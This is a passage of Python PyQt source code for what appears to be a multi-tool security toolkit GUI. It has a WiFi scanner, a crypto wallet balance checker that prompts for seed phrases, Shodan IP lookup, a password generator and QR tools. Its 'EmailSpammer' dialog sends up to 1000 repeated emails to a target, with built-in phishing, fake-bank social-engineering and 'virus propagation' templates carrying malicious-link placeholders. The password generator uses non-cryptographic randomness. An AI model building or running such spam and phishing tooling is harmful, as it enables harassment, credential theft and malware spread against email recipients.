        self.graph_timer.timeout.connect(self.update_graphs)
        self.graph_timer.start(100)  

    def create_scan_tab(self):
        scan_tab = QWidget()
        layout = QVBoxLayout()
        control_panel = QGroupBox("Control Panel")
        control_layout = QHBoxLayout()

        self.scan_button = QPushButton("Start Scan")
        self.scan_button.clicked.connect(self.start_scan)
        control_layout.addWidget(self.scan_button)

        self.stop_button = QPushButton("Stop Scan")
        self.stop_button.clicked.connect(self.stop_scan)
        self.stop_button.setEnabled(False)
        control_layout.addWidget(self.stop_button)

        interval_label = QLabel("Scan Interval:")
        control_layout.addWidget(interval_label)

        self.interval_combo = QComboBox()
        self.interval_combo.addItems(["5 sec", "10 sec", "30 sec", "1 min"])
        self.interval_combo.currentIndexChanged.connect(self.update_scan_interval)
        control_layout.addWidget(self.interval_combo)

        channel_label = QLabel("Channel:")
        control_layout.addWidget(channel_label)

        self.channel_combo = QComboBox()
        self.channel_combo.addItems(["All"] + [str(i) for i in range(1, 15)])
        self.channel_combo.currentIndexChanged.connect(self.update_channel)
        control_layout.addWidget(self.channel_combo)

        band_label = QLabel("Band:")
        control_layout.addWidget(band_label)

        self.band_combo = QComboBox()
        self.band_combo.addItems(["All", "2.4 GHz", "5 GHz"])
        self.band_combo.currentIndexChanged.connect(self.update_band)
        control_layout.addWidget(self.band_combo)

        self.auto_refresh_check = QCheckBox("Auto Refresh")
        self.auto_refresh_check.setChecked(True)
        control_layout.addWidget(self.auto_refresh_check)

        self.signal_threshold = QSpinBox()
        self.signal_threshold.setRange(-100, 0)
        self.signal_threshold.setValue(-80)
        self.signal_threshold.setPrefix("Signal Threshold: ")
        self.signal_threshold.setSuffix(" dBm")
        control_layout.addWidget(self.signal_threshold)

        control_panel.setLayout(control_layout)
        layout.addWidget(control_panel)
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        layout.addWidget(self.progress_bar)
        self.network_table = QTableWidget()
        self.network_table.setColumnCount(7)
        self.network_table.setHorizontalHeaderLabels(["SSID", "Signal Strength (dBm)", "Frequency (GHz)", "Security", "Cipher", "BSSID", "Channel"])
        self.network_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.network_table.setAlternatingRowColors(True)
        self.network_table.setSortingEnabled(True)
        layout.addWidget(self.network_table)
        filter_layout = QHBoxLayout()
        filter_layout.addWidget(QLabel("Filter:"))
        self.filter_input = QLineEdit()
        self.filter_input.textChanged.connect(self.apply_filter)
        filter_layout.addWidget(self.filter_input)
        layout.addLayout(filter_layout)

        scan_tab.setLayout(layout)
        return scan_tab

    def create_graph_tab(self):
        graph_tab = QWidget()
        layout = QVBoxLayout()
        
        self.signal_figure = Figure(figsize=(5, 4), dpi=100)
        self.signal_canvas = FigureCanvas(self.signal_figure)
        self.signal_figure.patch.set_facecolor('#2E2E2E')
        layout.addWidget(self.signal_canvas)
        
        self.channel_figure = Figure(figsize=(5, 4), dpi=100)
        self.channel_canvas = FigureCanvas(self.channel_figure)
        self.channel_figure.patch.set_facecolor('#2E2E2E')
        layout.addWidget(self.channel_canvas)

        graph_tab.setLayout(layout)
        return graph_tab

    def create_settings_tab(self):
        settings_tab = QWidget()
        layout = QVBoxLayout()

        graph_settings = QGroupBox("Graph Settings")
        graph_layout = QVBoxLayout()

        self.show_grid_check = QCheckBox("Show Grid")
        self.show_grid_check.setChecked(True)
        graph_layout.addWidget(self.show_grid_check)

        self.graph_style_combo = QComboBox()
        self.graph_style_combo.addItems(["Line", "Scatter", "Bar"])
        graph_layout.addWidget(QLabel("Graph Style:"))
        graph_layout.addWidget(self.graph_style_combo)

        self.history_length_slider = QSlider(Qt.Horizontal)
        self.history_length_slider.setRange(10, 100)
        self.history_length_slider.setValue(50)
        graph_layout.addWidget(QLabel("History Length:"))
        graph_layout.addWidget(self.history_length_slider)

        graph_settings.setLayout(graph_layout)
        layout.addWidget(graph_settings)

        scan_settings = QGroupBox("Scan Settings")
        scan_layout = QVBoxLayout()

        self.scan_timeout_spin = QSpinBox()
        self.scan_timeout_spin.setRange(1, 30)
        self.scan_timeout_spin.setValue(2)
        self.scan_timeout_spin.setSuffix(" sec")
        scan_layout.addWidget(QLabel("Scan Timeout:"))
        scan_layout.addWidget(self.scan_timeout_spin)

        self.max_networks_spin = QSpinBox()
        self.max_networks_spin.setRange(10, 100)
        self.max_networks_spin.setValue(50)
        scan_layout.addWidget(QLabel("Max Networks to Display:"))
        scan_layout.addWidget(self.max_networks_spin)

        scan_settings.setLayout(scan_layout)
        layout.addWidget(scan_settings)

        settings_tab.setLayout(layout)
        return settings_tab

    def start_scan(self):
        self.scan_thread = WiFiScanThread(self.scan_interval, self.channel, self.band)
        self.scan_thread.scan_result_signal.connect(self.update_table)
        self.scan_thread.progress_signal.connect(self.update_progress)
        self.scan_thread.start()

        self.scan_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setValue(0)

    def stop_scan(self):
        if self.scan_thread:
            self.scan_thread.stop()
        self.progress_bar.setValue(100)
        self.scan_button.setEnabled(True)
        self.stop_button.setEnabled(False)

    def update_table(self, networks):
        max_networks = self.max_networks_spin.value()
        networks = sorted(networks, key=lambda x: x[1], reverse=True)[:max_networks]
        self.network_table.setRowCount(len(networks))
        for row, network in enumerate(networks):
            ssid, signal, freq, security, cipher, bssid, channel = network
            if signal < self.signal_threshold.value():
                continue
            for col, item in enumerate(network):
                cell = QTableWidgetItem(str(item))
                if col == 1: 
                    cell.setData(Qt.DisplayRole, item)
                    cell.setTextAlignment(Qt.AlignCenter)
                    if item >= -50:
                        cell.setBackground(Qt.green)
                    elif -50 > item >= -60:
                        cell.setBackground(Qt.yellow)
                    else:
                        cell.setBackground(Qt.red)
                self.network_table.setItem(row, col, cell)
            if ssid not in self.network_history:
                self.network_history[ssid] = []
            self.network_history[ssid].append((time.time(), signal, channel))

        self.network_table.sortItems(1, Qt.DescendingOrder)
        self.apply_filter()

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def update_scan_interval(self, index):
        intervals = [5, 10, 30, 60]
        self.scan_interval = intervals[index]

    def update_channel(self, index):
        self.channel = index - 1

    def update_band(self, index):
        self.band = self.band_combo.currentText()

    def apply_filter(self):
        filter_text = self.filter_input.text().lower()
        for row in range(self.network_table.rowCount()):
            ssid = self.network_table.item(row, 0)
            if ssid and filter_text in ssid.text().lower():
                self.network_table.setRowHidden(row, False)
            else:
                self.network_table.setRowHidden(row, True)

    def update_graphs(self):
        if not self.auto_refresh_check.isChecked():
            return
        self.signal_figure.clear()
        ax = self.signal_figure.add_subplot(111)
        ax.set_facecolor('#2E2E2E')

        history_length = self.history_length_slider.value()
        graph_style = self.graph_style_combo.currentText().lower()

        for ssid, history in self.network_history.items():
            timestamps = [entry[0] for entry in history[-history_length:]]
            signals = [entry[1] for entry in history[-history_length:]]
            if graph_style == 'line':
                ax.plot(timestamps, signals, label=ssid)
            elif graph_style == 'scatter':
                ax.scatter(timestamps, signals, label=ssid)
            elif graph_style == 'bar':
                ax.bar(timestamps, signals, label=ssid, alpha=0.5)

        ax.set_title("Signal Strength Over Time", color='white')
        ax.set_xlabel("Time", color='white')
        ax.set_ylabel("Signal Strength (dBm)", color='white')
        ax.set_ylim(-100, 0)
        ax.legend(facecolor='#2E2E2E', edgecolor='white', labelcolor='white')
        
        ax.tick_params(colors='white') 
        ax.spines['bottom'].set_color('white') 
        ax.spines['top'].set_color('white') 
        ax.spines['right'].set_color('white')
        ax.spines['left'].set_color('white')
        
        if self.show_grid_check.isChecked():
            ax.grid(True, color='gray', linestyle='--', alpha=0.5)

        self.signal_canvas.draw()
        self.channel_figure.clear()
        ax = self.channel_figure.add_subplot(111)
        ax.set_facecolor('#2E2E2E')
        self.channel_canvas.draw()


    
class CryptoWalletChecker(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Crypto Wallet Checker")
        self.setWindowIcon(QIcon('imgs/crypto_checker.png'))
        self.setFixedSize(600, 650)

        main_layout = QVBoxLayout()
        check_type_layout = QHBoxLayout()
        self.check_type_group = QButtonGroup(self)
        self.balance_check_radio = QRadioButton("Balance Check")
        self.wallet_check_radio = QRadioButton("Wallet Check")
        self.balance_check_radio.setChecked(True)
        self.check_type_group.addButton(self.balance_check_radio)
        self.check_type_group.addButton(self.wallet_check_radio)
        check_type_layout.addWidget(self.balance_check_radio)
        check_type_layout.addWidget(self.wallet_check_radio)
        main_layout.addLayout(check_type_layout)

        blockchain_layout = QVBoxLayout()
        self.blockchain_combo = QComboBox()
        self.blockchain_combo.addItems(["Bitcoin", "Ethereum", "Litecoin"])
        blockchain_layout.addWidget(QLabel("Select Blockchain:"))
        blockchain_layout.addWidget(self.blockchain_combo)
        main_layout.addLayout(blockchain_layout)

        wallet_layout = QVBoxLayout()
        self.wallet_entry = QLineEdit()
        self.wallet_entry.setPlaceholderText("Enter wallet address")
        wallet_layout.addWidget(QLabel("Wallet Address:"))
        wallet_layout.addWidget(self.wallet_entry)
        main_layout.addLayout(wallet_layout)

        api_key_layout = QVBoxLayout()
        self.api_key_entry = QLineEdit()
        self.api_key_entry.setPlaceholderText("Enter API key")
        api_key_layout.addWidget(QLabel("API Key:"))
        api_key_layout.addWidget(self.api_key_entry)
        main_layout.addLayout(api_key_layout)

        credentials_layout = QHBoxLayout()
        self.password_entry = QLineEdit()
        self.password_entry.setPlaceholderText("Enter wallet password (if applicable)")
        self.password_entry.setEchoMode(QLineEdit.Password)
        self.password_entry.setDisabled(True)
        credentials_layout.addWidget(QLabel("Password:"))
        credentials_layout.addWidget(self.password_entry)

        self.seed_entry = QLineEdit()
        self.seed_entry.setPlaceholderText("Enter seed phrase (if applicable)")
        self.seed_entry.setDisabled(True)
        credentials_layout.addWidget(QLabel("Seed Phrase:"))
        credentials_layout.addWidget(self.seed_entry)
        main_layout.addLayout(credentials_layout)
        self.wallet_check_radio.toggled.connect(self.toggle_wallet_fields)

        self.results_area = QTextEdit()
        self.results_area.setReadOnly(True)
        main_layout.addWidget(self.results_area)
        button_layout = QHBoxLayout()
        self.start_button = QPushButton("Start Checking")
        self.start_button.clicked.connect(self.start_checking)
        button_layout.addStretch()
        button_layout.addWidget(self.start_button)
        button_layout.addStretch()
        main_layout.addLayout(button_layout)

        self.setLayout(main_layout)

    def toggle_wallet_fields(self):
        is_wallet_check = self.wallet_check_radio.isChecked()
        self.password_entry.setEnabled(is_wallet_check)
        self.seed_entry.setEnabled(is_wallet_check)

    def start_checking(self):
        wallet_address = self.wallet_entry.text().strip()
        api_key = self.api_key_entry.text().strip()
        password = self.password_entry.text().strip()
        seed_phrase = self.seed_entry.text().strip()
        blockchain = self.blockchain_combo.currentText()

        if not wallet_address:
            QMessageBox.warning(self, "Input Error", "Please enter a wallet address.")
            return

        if not api_key:
            QMessageBox.warning(self, "Input Error", "Please enter an API key.")
            return

        if self.wallet_check_radio.isChecked() and not password and not seed_phrase:
            QMessageBox.warning(self, "Input Error", "Please enter either a password or seed phrase for wallet check.")
            return

        self.results_area.clear()
        self.results_area.append(f"Starting check on {blockchain} wallet: {wallet_address}\n")

        try:
            if self.balance_check_radio.isChecked():
                self.check_balance(wallet_address, blockchain, api_key)
            else:
                self.check_wallet(wallet_address, password, seed_phrase, blockchain, api_key)
        except Exception as e:
            self.results_area.append(f"[ERROR] An error occurred: {str(e)}\n")

        self.results_area.append("Check completed.\n")

    def check_balance(self, wallet_address, blockchain, api_key):
        try:
            if blockchain == "Bitcoin":
                url = f"https://blockchain.info/rawaddr/{wallet_address}"
            elif blockchain == "Ethereum":
                url = f"https://api.etherscan.io/api?module=account&action=balance&address={wallet_address}&tag=latest&apikey={api_key}"
            elif blockchain == "Litecoin":
                url = f"https://chain.so/api/v2/get_address_balance/LTC/{wallet_address}"
            else:
                self.results_area.append(f"[ERROR] Blockchain {blockchain} is not supported.\n")
                return

            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                if blockchain == "Bitcoin":
                    balance = data['final_balance'] / 10**8
                    self.results_area.append(f"Balance: {balance} BTC\n")
                    self.results_area.append(f"Total Received: {data['total_received'] / 10**8} BTC\n")
                    self.results_area.append(f"Total Sent: {data['total_sent'] / 10**8} BTC\n")
                    self.results_area.append(f"Number of Transactions: {data['n_tx']}\n")
                elif blockchain == "Ethereum":
                    balance = int(data['result']) / 10**18
                    self.results_area.append(f"Balance: {balance} ETH\n")
                elif blockchain == "Litecoin":
                    balance = float(data['data']['confirmed_balance'])
                    unconfirmed_balance = float(data['data']['unconfirmed_balance'])
                    self.results_area.append(f"Confirmed Balance: {balance} LTC\n")
                    self.results_area.append(f"Unconfirmed Balance: {unconfirmed_balance} LTC\n")
            else:
                self.results_area.append(f"[ERROR] Failed to fetch balance for {blockchain} wallet: {response.status_code}\n")
        except Exception as e:
            self.results_area.append(f"[ERROR] An error occurred: {str(e)}\n")

    def check_wallet(self, wallet_address, password, seed_phrase, blockchain, api_key):
        self.results_area.append("[ERROR] Wallet check functionality is not implemented in this version.\n")
        self.results_area.append("For security reasons, direct wallet checks should be implemented with caution.\n")
        self.results_area.append("Consider using hardware wallets or official wallet software for secure checks.\n")


class EmailSpammer(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Mail Spammer")
        self.setWindowIcon(QIcon('imgs/emailspammer.png'))
        self.setFixedSize(1000, 700)

        layout = QVBoxLayout()
        smtp_group = QGroupBox("SMTP Settings")
        smtp_layout = QGridLayout()
        self.server_entry = self.create_line_edit("SMTP Server", "smtp.example.com")
        self.port_entry = self.create_line_edit("Port", "587")
        self.encryption_selector = QComboBox()
        self.encryption_selector.addItems(["None", "SSL", "TLS"])
        
        smtp_layout.addWidget(QLabel("SMTP Server:"), 0, 0)
        smtp_layout.addWidget(self.server_entry, 0, 1)
        smtp_layout.addWidget(QLabel("Port:"), 1, 0)
        smtp_layout.addWidget(self.port_entry, 1, 1)
        smtp_layout.addWidget(QLabel("Encryption:"), 2, 0)
        smtp_layout.addWidget(self.encryption_selector, 2, 1)
        smtp_group.setLayout(smtp_layout)
        layout.addWidget(smtp_group)
        credentials_group = QGroupBox("Your Email Credentials")
        credentials_layout = QGridLayout()
        self.email_entry = self.create_line_edit("Your Email", "renc@thiasoft.com")
        self.password_entry = self.create_line_edit("Password", is_password=True)
        credentials_layout.addWidget(QLabel("Email Address:"), 0, 0)
        credentials_layout.addWidget(self.email_entry, 0, 1)
        credentials_layout.addWidget(QLabel("Password:"), 1, 0)
        credentials_layout.addWidget(self.password_entry, 1, 1)
        credentials_group.setLayout(credentials_layout)
        layout.addWidget(credentials_group)
        recipient_group = QGroupBox("Recipient and Message")
        recipient_layout = QGridLayout()
        self.recipient_entry = self.create_line_edit("Recipient Email", "target@example.com")
        self.template_selector = QComboBox()
        self.template_selector.addItems([
            "Custom Message",
            "Friendly Reminder",
            "Account Security Alert",
            "Congratulations on Your Win!",
            "Exclusive Offer",
            "Payment Confirmation",
            "Password Reset Request",
            "Phishing Template",
            "Social Engineering Bank",
            "Virus Propagation Template"
        ])
        self.template_selector.currentIndexChanged.connect(self.load_template)

        self.message_entry = QTextEdit()
        self.message_entry.setPlaceholderText("Message content will appear here...")

        recipient_layout.addWidget(QLabel("Recipient Email:"), 0, 0)
        recipient_layout.addWidget(self.recipient_entry, 0, 1)
        recipient_layout.addWidget(QLabel("Template:"), 1, 0)
        recipient_layout.addWidget(self.template_selector, 1, 1)
        recipient_layout.addWidget(QLabel("Message Content:"), 2, 0)
        recipient_layout.addWidget(self.message_entry, 2, 1, 2, 1)
        recipient_group.setLayout(recipient_layout)
        layout.addWidget(recipient_group)
        settings_group = QGroupBox("Advanced Settings")
        settings_layout = QGridLayout()

        self.delay_spinbox = QSpinBox()
        self.delay_spinbox.setRange(1, 60)
        self.delay_spinbox.setValue(5)
        self.delay_spinbox.setSuffix(" sec")

        self.repetition_spinbox = QSpinBox()
        self.repetition_spinbox.setRange(1, 1000)
        self.repetition_spinbox.setValue(1)

        self.reply_to_entry = self.create_line_edit("Reply-To Email (optional)")
        self.subject_entry = self.create_line_edit("Email Subject", "Subject Here")

        settings_layout.addWidget(QLabel("Delay Between Emails:"), 0, 0)
        settings_layout.addWidget(self.delay_spinbox, 0, 1)
        settings_layout.addWidget(QLabel("Number of Emails:"), 1, 0)
        settings_layout.addWidget(self.repetition_spinbox, 1, 1)
        settings_layout.addWidget(QLabel("Reply-To Email:"), 2, 0)
        settings_layout.addWidget(self.reply_to_entry, 2, 1)
        settings_layout.addWidget(QLabel("Email Subject:"), 3, 0)
        settings_layout.addWidget(self.subject_entry, 3, 1)

        self.save_template_button = QPushButton("Save Current Template")
        self.save_template_button.clicked.connect(self.save_template)
        settings_layout.addWidget(self.save_template_button, 4, 0, 1, 2)

        settings_group.setLayout(settings_layout)
        layout.addWidget(settings_group)
        button_layout = QHBoxLayout()
        self.send_button = QPushButton("Start Sending")
        self.send_button.clicked.connect(self.send_email)
        button_layout.addWidget(self.send_button)
        self.stop_button = QPushButton("Stop Sending")
        self.stop_button.setEnabled(False)
        button_layout.addWidget(self.stop_button)

        layout.addLayout(button_layout)
        self.setLayout(layout)

    def create_line_edit(self, placeholder, default_text="", is_password=False):
        line_edit = QLineEdit()
        line_edit.setPlaceholderText(placeholder)
        line_edit.setText(default_text)
        if is_password:
            line_edit.setEchoMode(QLineEdit.Password)
        return line_edit

    def load_template(self):
        templates = {
        "Friendly Reminder": "Hello,\n\nThis is a friendly reminder about our upcoming meeting. We look forward to seeing you there.\n\nBest regards,\nYour Team",
        "Account Security Alert": "Dear User,\n\nWe have noticed unusual activity in your account. To ensure your security, please update your password at your earliest convenience.\n\nBest regards,\nThe Security Team",
        "Congratulations on Your Win!": "Hi,\n\nCongratulations on your incredible win! Please reach out to us to claim your prize. We're excited to celebrate with you!\n\nBest regards,\nThe Events Team",
        "Exclusive Offer": "Hi,\n\nYou’ve been specially selected for an exclusive offer! Don’t miss this opportunity to benefit from our limited-time promotion.\n\nBest regards,\nThe Offers Team",
        "Payment Confirmation": "Dear Customer,\n\nThank you for your payment! We have successfully processed your transaction. If you have any questions, feel free to reach out.\n\nBest regards,\nThe Billing Team",
        "Password Reset Request": "Hi,\n\nWe’ve received a request to reset your password. Please use the link below to complete the process securely:\n\n[password reset link]\n\nBest regards,\nThe Support Team",
        "Phishing Template": "Dear Customer,\n\nWe urgently need you to verify your account information to avoid service suspension. Please use this link to proceed: [malicious link]\n\nBest regards,\nSupport Team",
        "Social Engineering Bank": "Dear Valued Customer,\n\nTo protect your account, we require verification of your banking details. Kindly respond promptly to this email.\n\nBest regards,\nYour Bank",
        "Virus Propagation Template": "Hi,\n\nI just found this incredible app and thought of sharing it with you! Check it out here: [malicious link]\n\nBest regards,\nYour Friend"
}

        selected_template = self.template_selector.currentText()
        if selected_template in templates:
            self.message_entry.setPlainText(templates[selected_template])
        else:
            self.message_entry.clear()

    def save_template(self):
        current_message = self.message_entry.toPlainText()
        if not current_message.strip():
            QMessageBox.warning(self, "Error", "Cannot save an empty template.")
            return

        template_name, ok = QInputDialog.getText(self, "Save Template", "Enter template name:")
        if ok and template_name.strip():
            self.template_selector.addItem(template_name)
            QMessageBox.information(self, "Success", f"Template '{template_name}' saved successfully.")

    def send_email(self):
        server = self.server_entry.text()
        port = self.port_entry.text()
        email = self.email_entry.text()
        password = self.password_entry.text()
        recipient = self.recipient_entry.text()
        subject = self.subject_entry.text()
        reply_to = self.reply_to_entry.text()
        message = self.message_entry.toPlainText()
        delay = self.delay_spinbox.value()
        repetitions = self.repetition_spinbox.value()

        if not all([server, port, email, password, recipient, message]):
            QMessageBox.warning(self, "Error", "Please fill in all fields.")
            return

        try:
            for i in range(repetitions):
                msg = MIMEMultipart()
                msg['From'] = email
                msg['To'] = recipient
                msg['Subject'] = subject
                if reply_to:
                    msg['Reply-To'] = reply_to
                msg.attach(MIMEText(message, 'plain'))

                with smtplib.SMTP(server, int(port)) as smtp:
                    if self.encryption_selector.currentText() == "SSL":
                        smtp = smtplib.SMTP_SSL(server, int(port))
                    elif self.encryption_selector.currentText() == "TLS":
                        smtp.starttls()
                    smtp.login(email, password)
                    smtp.sendmail(email, recipient, msg.as_string())

                time.sleep(delay)

            QMessageBox.information(self, "Success", f"Sent {repetitions} emails successfully.")
        except smtplib.SMTPException as e:
            QMessageBox.critical(self, "Error", f"Failed to send email: {str(e)}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"An unexpected error occurred: {str(e)}")

class ShodanScanner(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Shodan IP Scanner")
        self.setWindowIcon(QIcon('imgs/shodan.png'))
        self.setFixedSize(800, 600)

        layout = QVBoxLayout()
        self.api_entry = QLineEdit()
        self.api_entry.setPlaceholderText("Enter your Shodan API Key")
        layout.addWidget(self.api_entry)
        self.ip_entry = QLineEdit()
        self.ip_entry.setPlaceholderText("Enter IP address to scan (e.g., 8.8.8.8)")
        layout.addWidget(self.ip_entry)
        self.scan_button = QPushButton("Start Scan")
        self.scan_button.clicked.connect(self.start_scan)
        layout.addWidget(self.scan_button)
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.hide()
        layout.addWidget(self.progress_bar)
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)
        self.additional_settings_label = QLabel("Additional Settings:")
        layout.addWidget(self.additional_settings_label)

        self.vulnerabilities_check = QCheckBox("Show Vulnerabilities")
        self.vulnerabilities_check.setChecked(True) 
        layout.addWidget(self.vulnerabilities_check)

        self.service_info_check = QCheckBox("Show Service Information")
        self.service_info_check.setChecked(True) 
        layout.addWidget(self.service_info_check)

        self.ports_info_check = QCheckBox("Show Ports Information")
        self.ports_info_check.setChecked(True)
        layout.addWidget(self.ports_info_check)

        self.setLayout(layout)

    def start_scan(self):
        api_key = self.api_entry.text().strip()
        ip = self.ip_entry.text().strip()
        if not api_key:
            QMessageBox.warning(self, "Error", "Please enter a valid Shodan API Key")
            return
        if not ip:
            QMessageBox.warning(self, "Error", "Please enter a valid IP address")
            return
        self.result_text.clear()
        self.scan_button.setEnabled(False)
        self.progress_bar.setValue(10)
        self.progress_bar.show()

        self.scan_shodan(api_key, ip)

    def scan_shodan(self, api_key, ip):
        try:
            import requests
            url = f"https://api.shodan.io/shodan/host/{ip}?key={api_key}"
            response = requests.get(url)
            self.handle_response(response)
        except Exception as e:
            self.result_text.append(f"Error: {str(e)}")
            self.progress_bar.setValue(0)
            self.scan_button.setEnabled(True)

    def handle_response(self, response):
        self.progress_bar.setValue(50)
        if response.status_code == 200:
            data = response.json()
            self.result_text.clear()
            self.result_text.append(f"--- Scanning Results for IP: {data.get('ip_str', 'N/A')} ---\n")
            self.result_text.append(f"** Organization: {data.get('org', 'N/A')}")
            self.result_text.append(f"** Country: {data.get('country_name', 'N/A')}")
            if self.vulnerabilities_check.isChecked():
                vulnerabilities = data.get('vulns', [])
                if vulnerabilities:
                    self.result_text.append(f"** Vulnerabilities: {', '.join(vulnerabilities)}")
                else:
                    self.result_text.append("** Vulnerabilities: None")
            if self.service_info_check.isChecked():
                self.result_text.append("\n** Services:")
                for item in data.get('data', []):
                    port = item.get('port', 'Unknown')
                    service = item.get('product', 'Unknown Service')
                    self.result_text.append(f" - Port {port}: {service}")
            self.result_text.append("\n** Additional Information:")
            self.result_text.append(f"** ISP: {data.get('isp', 'N/A')}")
            self.result_text.append(f"** Last Update: {data.get('last_update', 'N/A')}")
            self.result_text.append(f"** Hostn ames: {', '.join(data.get('hostnames', []))}")
            self.result_text.append(f"** Tags: {', '.join(data.get('tags', []))}")
            self.result_text.append("\n** Complete Response Data:")
            self.result_text.append(f"{data}")
        else:
            self.result_text.append(f"Error: {response.status_code} - {response.reason}")
        self.progress_bar.setValue(100)
        self.scan_button.setEnabled(True)
    def is_vulnerable(self, response):
        return bool(response.get('vulns', []))

class PasswordGenerator(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Password Generator")
        self.setWindowIcon(QIcon('imgs/passwordgen.png'))
        self.setFixedSize(800, 600)
        layout = QVBoxLayout()
        self.length_label = QLabel("Password Length:")
        layout.addWidget(self.length_label)
        self.length_entry = QLineEdit()
        self.length_entry.setPlaceholderText("Enter password length")
        layout.addWidget(self.length_entry)
        self.include_special_check = QCheckBox("Include Special Characters")
        self.include_special_check.setChecked(True)
        layout.addWidget(self.include_special_check)
        self.include_numbers_check = QCheckBox("Include Numbers")
        self.include_numbers_check.setChecked(True)
        layout.addWidget(self.include_numbers_check)
        self.include_uppercase_check = QCheckBox("Include Uppercase Letters")
        self.include_uppercase_check.setChecked(True)
        layout.addWidget(self.include_uppercase_check)
        self.generate_button = QPushButton("Generate Password")
        self.generate_button.clicked.connect(self.gendpassword)
        layout.addWidget(self.generate_button)
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.hide()
        layout.addWidget(self.progress_bar)
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)
        self.setLayout(layout)

    def gendpassword(self):
        length_text = self.length_entry.text().strip()
        
        if not length_text:
            QMessageBox.warning(self, "Error", "Please specify a password length.")
            return
        
        try:
            length = int(length_text)
            if length < 6:
                raise ValueError("Password length must be at least 6 characters.")
        except ValueError as e:
            QMessageBox.warning(self, "Error", str(e))
            return

        self.progress_bar.show()
        self.progress_bar.setValue(10)  
        self.result_text.clear()
        self.result_text.append("Generating password...\n")
        self.progress_bar.setValue(50)
        password = self.crtd(length)
        self.progress_bar.setValue(100)
        self.result_text.append(f"Generated Password: {password}")

    def crtd(self, length):
        char_pool = string.ascii_lowercase
        if self.include_uppercase_check.isChecked():
            char_pool += string.ascii_uppercase
        if self.include_numbers_check.isChecked():
            char_pool += string.digits
        if self.include_special_check.isChecked():
            char_pool += string.punctuation
        
        password = ''.join(random.choice(char_pool) for _ in range(length))
        return password



class QrCodeGenerator(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("QR Code Manager")
        self.setWindowIcon(QIcon('imgs/qrcode.png'))
        self.setFixedSize(700, 500)

        main_layout = QVBoxLayout()

        self.tabs = QTabWidget()
        generate_tab = QWidget()
        generate_layout = QVBoxLayout()

        self.link_label = QLabel("Enter URL:")
        generate_layout.addWidget(self.link_label)

        self.link_entry = QLineEdit()
        self.link_entry.setPlaceholderText("Enter the URL to generate a QR code")
        generate_layout.addWidget(self.link_entry)

        self.generate_button = QPushButton("Generate QR Code")
        self.generate_button.clicked.connect(self.generate_qr_code)
        generate_layout.addWidget(self.generate_button)

        self.qr_display = QLabel()
        self.qr_display.setAlignment(Qt.AlignCenter)
        generate_layout.addWidget(self.qr_display)

        generate_tab.setLayout(generate_layout)
        self.tabs.addTab(generate_tab, "Generate")
        read_tab = QWidget()
        read_layout = QVBoxLayout()

        self.image_label = QLabel("No image selected")
        self.image_label.setAlignment(Qt.AlignCenter)
        read_layout.addWidget(self.image_label)

        self.select_image_button = QPushButton("Select QR Code Image")
        self.select_image_button.clicked.connect(self.select_image)
        read_layout.addWidget(self.select_image_button)

        self.decode_button = QPushButton("Decode QR Code")
        self.decode_button.clicked.connect(self.decode_qr_code)
        read_layout.addWidget(self.decode_button)

        self.decoded_text_label = QLabel("Decoded Text: ")
        read_layout.addWidget(self.decoded_text_label)

        read_tab.setLayout(read_layout)
        self.tabs.addTab(read_tab, "Read")

        main_layout.addWidget(self.tabs)
        self.setLayout(main_layout)

    def generate_qr_code(self):
        url = self.link_entry.text().strip()
        if not url:
            QMessageBox.warning(self, "Error", "Please enter a URL.")
            return

        try:
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=10,
                border=4,
            )
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            buffer = BytesIO()
            img.save(buffer, format="PNG")
            pixmap = QPixmap()
            pixmap.loadFromData(buffer.getvalue())
            self.qr_display.setPixmap(pixmap)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate QR code: {str(e)}")

    def select_image(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Image", "", "Image Files (*.png *.jpg *.jpeg)")
        if file_path:
            self.image_label.setPixmap(QPixmap(file_path).scaled(300, 300, Qt.KeepAspectRatio))
            self.image_label.setText("")
            self.image_path = file_path

    def decode_qr_code(self):
        try:
            img = Image.open(self.image_path)
            decoded_objects = decode(img)
            if decoded_objects:
                self.decoded_text_label.setText(f"Decoded Text: {decoded_objects[0].data.decode('utf-8')}")
            else:
                QMessageBox.warning(self, "Error", "No QR code found in the image.")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to decode QR code: {str(e)}")


class OsintFrameworkViewer(QDialog):
    def __init__(self, json_file=None):
        super().__init__()
        self.default_data = {
            "name": "OSINT Framework",
            "type": "folder",
            "children": [
                {
                    "name": "Username Search",
                    "type": "folder",
                    "children": [
                        {
                            "name": "WhatsMyName",
                            "type": "url",
                            "url": "https://whatsmyname.app/"
                        },
                        {
                            "name": "Namechk",
                            "type": "url", 
                            "url": "https://namechk.com/"
                        }
                    ]
                },
                {
                    "name": "Email Search",
